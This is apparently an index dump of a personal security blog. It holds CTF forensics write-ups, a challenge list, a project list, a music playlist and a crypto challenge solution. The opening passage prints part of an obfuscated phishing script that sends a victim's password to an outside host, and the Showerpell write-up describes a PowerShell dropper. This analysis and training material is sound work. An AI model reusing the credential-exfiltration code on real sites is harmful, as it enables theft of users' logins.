style=\"color:#a6e22e\"\u003e_0x2ae5a0\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003e_0x49225f\u003c/span\u003e){\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003e_0x4a91e4\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003e_0xaf724a\u003c/span\u003e,\u003cspan style=\"color:#a6e22e\"\u003e_0x1d14ff\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;s\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;n\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;t\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e],\u003cspan style=\"color:#a6e22e\"\u003e_0x1bcfcc\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e[];\u003cspan style=\"color:#a6e22e\"\u003einput\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eatob\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003e_0x49225f\u003c/span\u003e);\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003e_0x4d4b2f\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e;\u003cspan style=\"color:#a6e22e\"\u003e_0x4d4b2f\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003einput\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003e_0x4a91e4\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x88\u003c/span\u003e)];\u003cspan style=\"color:#a6e22e\"\u003e_0x4d4b2f\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e){\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003e_0x41b22f\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003einput\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003e_0x4a91e4\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x80\u003c/span\u003e)](\u003cspan style=\"color:#a6e22e\"\u003e_0x4d4b2f\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003e_0x1d14ff\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003e_0x4d4b2f\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003e_0x1d14ff\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003e_0x4a91e4\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x88\u003c/span\u003e)]][\u003cspan style=\"color:#a6e22e\"\u003e_0x4a91e4\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x80\u003c/span\u003e)](\u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e);\u003cspan style=\"color:#a6e22e\"\u003e_0x1bcfcc\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003e_0x4a91e4\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x96\u003c/span\u003e)](String[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;fromCharCode\u0026#39;\u003c/span\u003e](\u003cspan style=\"color:#a6e22e\"\u003e_0x41b22f\u003c/span\u003e));}\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003e_0x1bcfcc\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003e_0x4a91e4\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x98\u003c/span\u003e)](\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e);}\u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003e_0xe05049\u003c/span\u003e(){\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003e_0x3ebbc9\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003e_0xaf724a\u003c/span\u003e,\u003cspan style=\"color:#a6e22e\"\u003e_0x45261b\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003e_0x3a9d03\u003c/span\u003e,\u003cspan style=\"color:#a6e22e\"\u003e_0x2bf34e\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003e_0x38e031\u003c/span\u003e,\u003cspan style=\"color:#a6e22e\"\u003e_0x5ba78a\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003e_0x2ae5a0\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003e_0x37a3bb\u003c/span\u003e),\u003cspan style=\"color:#a6e22e\"\u003e_0x5b4edc\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eXMLHttpRequest\u003c/span\u003e();\u003cspan style=\"color:#a6e22e\"\u003e_0x5b4edc\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003e_0x3ebbc9\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x99\u003c/span\u003e)](\u003cspan style=\"color:#a6e22e\"\u003e_0x3ebbc9\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x8f\u003c/span\u003e),\u003cspan style=\"color:#a6e22e\"\u003e_0x3ebbc9\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x85\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003e_0x45261b\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026amp;password=\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003e_0x2bf34e\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003e_0x3ebbc9\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x84\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003eString(\u003cspan style=\"color:#a6e22e\"\u003e_0x5ba78a\u003c/span\u003e)),\u003cspan style=\"color:#a6e22e\"\u003e_0x5b4edc\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003e_0x3ebbc9\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x86\u003c/span\u003e)]();}\u003cspan style=\"color:#a6e22e\"\u003e_0xe05049\u003c/span\u003e();});}));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;/\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThis request contains the index.html page of the themrbeas7.org website.\u003cbr\u003e\nWe can spot a suspicious looking script at the end of the html file contained in the request, but it does not make a lot of sense. We can distinguish some strings such as \u003cem\u003epassword\u003c/em\u003e, \u003cem\u003efromCharCode\u003c/em\u003e, \u003cem\u003eh[x][x]ps://storage.appssec.co.ind?\u003c/em\u003e and so on.\u003cbr\u003e\nThis is basically obfuscated javascript. Let\u0026rsquo;s try to deobfuscate it and make sense of it.\u003cbr\u003e\nFor this purpose, we can use the online tool:\u003c/p\u003e","title":"Mr Beast Xmas Giveaway - Writeup"},{"content":"What\u0026rsquo;s this This page is about what music I feel helps me a lot when doing certain tasks and specifically playing CTF\u0026rsquo;s and reading cybersecurity related topics. Somehow, it gets me tunnel vision and concentration on what I do, kinda creating a sense of adrenaline which probably leads to my enhanced concentration. I am just going to write some thoughts I have on this genre of music I\u0026rsquo;ll be discussing later and providing a list of some of my favorite songs.\nMusic for hacking\u0026hellip;? Usually, when I play games or doing a task, such as solving a CTF, I really enjoyed listening to music at the same time (ok, who doesn\u0026rsquo;t:P ). Specifically, for the CTF part, it started with Lo-Fi, then it evolved to Techno and then\u0026hellip;I was kinda lost.\nI was bored at listening to the same genre of music even if I was finding new songs every day. Until one day, the youtube algorithm actually worked and introduced me to a whole new world of music. I don\u0026rsquo;t know how new or how old this type of music is, but its name is breakcore. I feel everything actually started of me listening to dreamcore (the complete opposite I would say from breakcore) before going to bed, but I am glad it led to it:)\nBreakcore - Is it actually breakcore? Well, I am no expect and probably a lot of the tracks I will be listing below are either DnB or Jungle, but I will just list them as breakcore cause I don\u0026rsquo;t really see hear of a difference and thus I cannot differentiate them. So let\u0026rsquo;s just say this will be a list of tracks from both of these 3 genres.\nAlso, it has some awesome art covers:\nListing some of my favorite songs Over time, I made the following separation of my playlists for this type of music:\nOn the left we have the playlist I call ctf_music and on the right we have the playlist I call ctf_study_music.\nctf_music list of songs This playlist is more for when some action is going on, let\u0026rsquo;s say a CTF contest is happening and I am speedrunning a chall. In general, it creates me a sense of adrenaline.\nMusic List\rArtist\rSong\rSorry about my face\rdsa\rMIX\rbreakcore mix to dissociate to\rMIX\rBreakcore that'll wake you into a deep sleep #2\rMR. KITTY\rAFTER DARK ( ACIDGVRL \u0026 SWIMSWIM BREAKCORE REMIX )\rTHXSOMCH\rSPIT IN MY FACE\rnedaj\rESCAPE (NEDAJ vs. AMORE)\rnedaj\rfuji\rnedaj\rLOMAJI + Nedaj - FEAR\r5ubaruu sh5＜＜＜ (feat. windowshopping)\rHeatace b4\rnedaj terminate\rnedaj MOON\rnedaj ESCAPE (nedaj vs amore) [demo]\ramore No Idols.\ramore The Archangel.\rTOKYOPILL Ethereal (Maya X Pionas Remix)\rcantbemyself I will never see you again\rnedaj INTO THE VOID\rOZZHTX, Nedaj, Amore WHAT DO YOU FEAR?\rllwll No Longer Human\rctf_study_music list of songs This playlist is more for when I want to concentrate while reading a new topic or writing a post. It creates a weird calming vibe to me and I feel I can concentrate more into what I am reading (and also enjoy the process more).\nMusic List\rArtist\rSong\rSewerslvt The Grilled Fish's Ballad\rDistroKid Serial Experiments\rTOKYOPILL Let's All Love Lain\rTOKYOPILL S u r r e a l i t y\rblack balloons HOLDMECLOSE\rFifty Grand \u0026 Optic Core Different Places\rFyex \u0026 Fifty Grand Existence\rイア / ia I wish to have a happy end\rBôa Duvet (Zenkaso Remix)\rcrys What colour are your wings?\rBLKSMIITH Satellite from days of old lead me to your access code (Boys Hotel Remix)\rbbragui Don't Be Afraid\rSymphonic Distribution Save me\rbbragui breakcore mix to feel yourself to\rOceanlab Satellite (Sewerslvt Edit) (reupload)\rMIX insurmountable -- a breakcore mix -- six\rSewerslvt Bring Me The Horizon - Drown (Sewerslvt Remix)\rNedaj \u0026 Passing Currents ECSTASY\rMIX forget the world | a breakcore/jungle playlist\r","permalink":"http://localhost:1313/music4hacking/","summary":"music","title":"Music for hacking"},{"content":"A list of challenges (at least some of them) that I have made for either conferences, CTFs or just myself:)\nThese will mostly be based on stuff I read along the way and felt like they would be fun to make and also learn by doing it.\nForensics An email from aunt Chloe\nDifficulty: Hard (Play/Writeup) Description: I recently got an email from my Aunt Chloe. She visited the village of Santa in the North pole and she was so kind that see sent me a traditional recipe that they make there followed by an image of the village. What an amazing Aunt!\rmr Beast Xmas Giveaway\nDifficulty: Easy (Play/Writeup) Description: It was almost Christmas. You made hot chocolate to drink, sat on your comfy couch, and watched the newly uploaded Mr Beast video. Soon after, an ad appeared on your screen that led to a giveaway page seemingly run by Mr\rBeast, offering a huge Christmas prize for a few lucky winners. Filled with excitement after the video, you subscribed to the giveaway page and waited. And waited. Christmas went by, but nothing happened. Shortly afterward, you discovered an article about a phishing website, the same one you subscribed to. Confused as you read through the article, you decided to investigate the website yourself and captured its traffic. What can you find?\rMr Anderson\nDifficulty: Medium (Play/Writeup) Description: Mr. Anderson received an urgent email in July from what appeared to be his bank, notifying him of an unpaid loan in his name. Despite attempts to resolve the issue through a linked page, which continuously failed to load, Mr. Anderson received no response to his inquiries. Instead, he discovered unauthorized transactions through email notifications, sparking urgent action to secure his compromised accounts and unravel the mystery behind the email's intentions.\rWeak legacy\nDifficulty: Easy (Play/Writeup) Description: Eve was able to intercept messages between Alice and Bob, but some seem to be encrypted. Can you help her find out what they were talking about?\rInsider\nDifficulty: Easy (Play/Writeup) Description: The CTFLIB team has been constantly growing becoming like a big family. Each month new players join our team and contribute with new challenges to the server. Recently though, we had an incident. A leak of some flags to a known stolen database forum has been reported. Since there was no indication of compromise to the server, the most possible scenario is that we have an insider in our team. You, being a trusted member, are asked to investigate the latest player that joined our community to see if we rightfully suspect him of leaking the flags. We supply you with an image of his system to start your investigation.\rFlag on the run\nDifficulty: Easy (Play/Writeup) Description: A wizard was on his way to trade some secret flags with some elves and get magic filters in exchange. But one of the flags managed to escape. To make matters worse, the flag covered its tracks based on an ancient papyrus it stole from the wizard as it fled. Fortunately for him, the wizard had a copy of this papyrus and thus he can recover the flags traces. Can you help the wizard find where the flag is hidding?\rHinting flags\nDifficulty: Easy (Play/Writeup) Description: Think you can crack this users' password hint? Try analyzing this memory dump and find out for yourself.\rHeadstream\nDifficulty: Medium (Play/Writeup) Description: My friend is in love with the GTA games. Recently, the GTAVI got leaked. As soon as he read about it, he rushed to piratesbay and to his surprise, someone had uploaded the leaked version. Full of joy, he downloaded the game bu upon opening it, an error was displayed. As much as he tried fixing it, he was met with the same error. Can you help him?\rMalware Carving\nDifficulty: Medium (Play/Writeup) Description: As i was researching on the topic of virtual memory and system paging, i downloaded some pdf files to read. It was at this point where once i closed some pdf files i had finished reading with my Adobe Reader, my Antivirus notified me about some outgoing connections from my pc. Can you find what happened? Since I was reading about virtual memory, i think its better to supply you with my pagefile.sys to see what was running at the time of the incident.\rChinese Windows Upgrader\nDifficulty: Hard (Play/Writeup) Description: I wanted to upgrade my Windows to Windows 11 pro so I searched for a way to do it. I ended up finding a batch script but there is something weird about it. Since this script did not work, I opened it to see how it works but it seems like the script is written in Chinese. Can you figure out what this script does? I will provide you with the script and a memory dump of the machine to see what you can find.\rAnother malicious doc\nDifficulty: Hard (Play/Writeup) Description: Not your typical doc.\rIRS went phishing\nDifficulty: Medium (Play/Writeup) Description: I never expected the IRS to owe me money. What a lucky man I am...or am I?\rShowerpell\nDifficulty: Medium (Play/Writeup) Description: We recently had a security incident where a user installed something malicious. The analysis of the incident seems never-ending as each step reveals a new level of complexity.\rUpgrading Windows\nDifficulty: Easy (Play/Writeup) Description: I could not be more happy with the upgrade of my Windows. However, who is this new user added in the system?\rsysupdate\nDifficulty: Easy (Play/Writeup) Description: A system update you shouldn't be looking forward to.\rcaptcha 4 humans\nDifficulty: Easy (Play/Writeup) Description: Can you crack this hash and bypass the anti-human CAPTCHA?\rReverse Engineering Ancient Cave Vault\nDifficulty: Easy (Play/Writeup) Description: In the heart of a forbidding cave, an intrepid explorer ventured through the oppressive darkness, shadows dancing at the edge of her lantern's light. She stumbled upon an enigmatic ancient vault, its entrance adorned with cryptic symbols. Determined, she desperately tries to find the correct passphrase that will unlock the secrets within. But her time is running low and the beasts of the cave are starting to wake up. Can you help her?\rCryptography Sloppy Encryptor\nDifficulty: Easy (Play/Writeup) Description: I wonder if we could somehow recover the original text from the mysterious file that was found on an old hard drive of a mathematician. A script was also recovered that seems to have encrypted the text. Can you manage to recover this mysterious files?\rSigning factory\nDifficulty: Medium (Play) Description: Visit HTB for more\r","permalink":"http://localhost:1313/mychallenges/","summary":"my challenges","title":"My Challenges"},{"content":"A list of projects/tools that I have made along my journey of learning, either that be for a CTF or a real world scenario.\nForensics PcapAnalysis (GitHub) A script that is useful when analyzing malware traffic pcaps. It's goal is to find all HTTP and HTTPS hosts that a victim IP interacted with. Once it runs through the pcap file and collects all hosts which interacted with the victim ip, it makes request to VirusTotal in order to distinguish the malicious ones with the rest. It saves ...\rWeb Attacks vulnerable_phpThumb (GitHub) A script which scrapes the web using dorks to find domains that still use vulnerable versions of the phpThumb php script.\rReversing tools DotNetParser (GitHub) A script that is used to quickly parse a .NET assembly to read its methods and instructions. It's just a quick way to parse and decompile raw bytecode to IL and read the instructions, instead of loading it to a decompiler like DnSpy, ILSpy etc.\rJlaive-Deobfuscator (GitHub) A script that deobfuscates and reconstructs all parts used in the Jlaive obfuscation process, including the final decrypted executable.\rObfuscation scripts forcoding-Obfuscator (GitHub) A script used for forcode-obfuscating cmd commands.\rAutomation tools / Scrapers pscrapy (GitHub) A script used for scraping the Pararius website, find and submit forms for new properties - also bypassing cloudflares anti-bot protection.\r","permalink":"http://localhost:1313/projects/","summary":"projects","title":"Projects"},{"content":"In this challenge, we are given a pcap file. By observing the packets in the pcap, one is identified which appears to be transferring a file named \u0026ldquo;dnsexfil.ps1\u0026rdquo;. Using the option File \u0026ndash;\u0026gt; Export Objects \u0026ndash;\u0026gt; HTTP in Wireshark, this file can be downloaded for further analysis. You can retrieve this packet from Wireshark by going to File \u0026ndash;\u0026gt; Export Objects \u0026ndash;\u0026gt; HTTP.\nWith the help of a text editor, we can open this powershell script and view its contents:\nThe file appears to contain encoded code.\nBy observing the code, the following significant elements are identified:\nAt the end of the file, there is the string \u0026ldquo;i\u0026rsquo;e\u0026rsquo;x\u0026rdquo;, which indicates how PowerShell commands are executed. This suggests that running the code will create an executable file. The malicious program to be created appears to decode a base64-encoded large string. The result of the decoding is decompressed using the deflateStream method. Following these steps, it is possible to retrieve the code that will be executed. For this purpose, the online tool CyberChef (https://gchq.github.io/CyberChef/) can be used.\nThe result is now in an unreadable format and can be saved into a file named \u0026ldquo;deobfuscated.ps1\u0026rdquo; for further analysis:\nThe code that emerges appears to decode from base64 and store a large string in a variable. Using CyberChef again, the decoding can be performed:\nThe result may not be as readable as the previous code; however, the first 2 bytes MZ indicate executable file headers. Therefore, it should be saved as a .exe file.\nUsing the file command, you can retrieve basic information about the executable, such as it being a .NET file:\n┌──(connar㉿kali)-[~/showerpell]\r└─$ file someExecutable.exe\rsomeExecutable.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows Since the executable is a .NET file, you can use the tool DNSPY to analyze its code:\nObserving the code, the flag of the challenge is identified as a variable within the main function:\nFLAG{y0u_h4v3_r34ch3d_7h3_d3p7h5_0f_4_r34l_w0rld_t00l_y0u_5h0uld_b3_pr0ud!}\nIn creating this challenge, tools used by malicious entities in the real world were leveraged.\n","permalink":"http://localhost:1313/ctfwriteups/showerpell/","summary":"\u003cp\u003eIn this challenge, we are given a pcap file. By observing the packets in the pcap, one is identified which appears to be transferring a file named \u0026ldquo;dnsexfil.ps1\u0026rdquo;. Using the option File \u0026ndash;\u0026gt; Export Objects \u0026ndash;\u0026gt; HTTP in Wireshark, this file can be downloaded for further analysis. You can retrieve this packet from Wireshark by going to File \u0026ndash;\u0026gt; Export Objects \u0026ndash;\u0026gt; HTTP.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/pmdk/showerpell/showerpell1.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eWith the help of a text editor, we can open this powershell script and view its contents:\u003c/p\u003e","title":"Showerpell - Writeup"},{"content":"This is a writeup for the sloppy encryptor challenge We are given an encrypted file containing unreadable text and the file used to produce it.\nThe encrypted text is: jkfdhlhfggkdekgkjfgkkgehhjjeflefgekiifehmmifdjigeldedleghhlejgeefehdeeffdkefefhkmiffkiefemeedemkmmehiidegjefefgfeefejfiifdmhlfdlidfifefieii \u0026#39;\u0026#39;\u0026#39; The file that created it is: \u0026#39;\u0026#39;\u0026#39; from random import randint as rint from secret_stuff import FLAG def encrypt(FLAG): return \u0026#34;\u0026#34;.join([str(ord(c))+str(rint(126, 254)) for c in FLAG]) def toBytes(enc): return \u0026#34;\u0026#34;.join([chr(int(enc[i])+100) for i in range(len(enc))]) with open(\u0026#34;./flag.enc\u0026#34;,\u0026#34;w\u0026#34;) as f: enc = encrypt(FLAG) enc_ = toBytes(enc) f.write(enc_) Text encryption process We can distinguish that the original code that encrypted the text performs the following steps:\nTakes each character of the plaintext and converts it to the corresponding ASCII number. Converts this ASCII number from integer type to string type. Adds a random number in the range [126, 254]. That is, let p be the initial number of the plaintext and r be the random number in [126, 254]. Then c = \u0026lsquo;p\u0026rsquo; + \u0026lsquo;r\u0026rsquo; = \u0026lsquo;pr\u0026rsquo; the corresponding encrypted character. The above encryption method does nothing more than insert random numbers between each character of the original text.\nAfterwards, the modified text undergoes further modification with the function toBytes(), where this function does the following:\nTakes each number of the modified text and adds 100 to it. That is, let i be the corresponding number of the i-th letter of the modified text. Then i\u0026rsquo; = i + 100. Takes the corresponding representation of this number in character. Joins the result characters into a single string and returns it. Decrypting the encrypted text process A first step for decrypting the encrypted text is to subtract 100 from each character. This is desirable because during the encryption process, the number 100 was added to each character.\n\u0026#39;\u0026#39;\u0026#39; We open the encrypted text and subtract the number 100 from each decimal representation of each character. \u0026#39;\u0026#39;\u0026#39; with open(\u0026#34;../flag.enc\u0026#34;,\u0026#34;r\u0026#34;) as f: enc = f.read() flag_enc = \u0026#34;\u0026#34;.join([str(ord(i)-100) for i in enc]) print(flag_enc) The result of the above process is as follows:\n\u0026gt; python decryptor.py\r702187616365133711791231715224295148531981082374821411215311217812125395148511801101269924050170121140112149552194815950192125143 Since we know that the flag format is FLAG{} and we know that the encryption algorithm adds random numbers between each character in the range [126, 254], we can easily distinguish some letters. Let\u0026rsquo;s look at the first 10 digits of the previous result:\n7021876163\r--\u0026gt; 70 was the first character.\rThen a three-digit random number was added between it and the 2nd character.\r--\u0026gt; 218 is the random number added between them.\rThen follows the next character of the original text.\r--\u0026gt; 76\rThen follows the next random number.\r--\u0026gt; 163\r...\rIf we take the representation of the numbers corresponding to the first 2 characters of the original text, we will see that: 1) chr(70) --\u0026gt; \u0026#39;F\u0026#39; 2) chr(76) --\u0026gt; \u0026#39;L\u0026#39; It kinda reminds us of the flag format (\u0026#39;FLAG\u0026#39;). The process is very simple for recovering the original text and can be automated. One way to do this is the following program, but everyone can create their own:\ndef getNum(start, end, flag): flag = \u0026#34;\u0026#34;.join(flag) return flag[start:end] with open(\u0026#34;../flag.enc\u0026#34;,\u0026#34;r\u0026#34;) as f: enc = f.read() flag_enc = \u0026#34;\u0026#34;.join([str(ord(i) - 100) for i in enc]) flag_dec = [] start = 0 end = 3 flag_enc = list(flag_enc) while flag_enc: enc = getNum(start, end, flag_enc) if int(enc) \u0026gt; 0xff: end = 2 continue if int(enc) \u0026lt; 126: flag_dec.append(int(enc)) flag_enc = list(flag_enc) del flag_enc[start: end] end = 3 else: del flag_enc[start: end] print(\u0026#34;\u0026#34;.join([chr(i) for i in flag_dec])) Running the script, we get the flag:\n\u0026gt; python decryptor.py\rFLAG{4_5l0ppy_3nc2yp702} ","permalink":"http://localhost:1313/ctfwriteups/sloppyencryptor/","summary":"\u003ch1 id=\"this-is-a-writeup-for-the-sloppy-encryptor-challenge\"\u003eThis is a writeup for the sloppy encryptor challenge\u003c/h1\u003e\n\u003cp\u003eWe are given an encrypted file containing unreadable text and the file used to produce it.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eThe encrypted text is: jkfdhlhfggkdekgkjfgkkgehhjjeflefgekiifehmmifdjigeldedleghhlejgeefehdeeffdkefefhkmiffkiefemeedemkmmehiidegjefefgfeefejfiifdmhlfdlidfifefieii\n\u003c/code\u003e\u003c/pre\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-py\" data-lang=\"py\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eThe file that created it is:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e random \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e randint \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e rint\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e secret_stuff \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e FLAG\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eencrypt\u003c/span\u003e(FLAG):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ejoin([str(ord(c))\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003estr(rint(\u003cspan style=\"color:#ae81ff\"\u003e126\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e254\u003c/span\u003e)) \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e c \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e FLAG])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etoBytes\u003c/span\u003e(enc):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ejoin([chr(int(enc[i])\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(len(enc))])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;./flag.enc\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;w\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    enc \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e encrypt(FLAG)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    enc_ \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e toBytes(enc)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewrite(enc_)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"text-encryption-process\"\u003eText encryption process\u003c/h3\u003e\n\u003cp\u003eWe can distinguish that the original code that encrypted the text performs the following 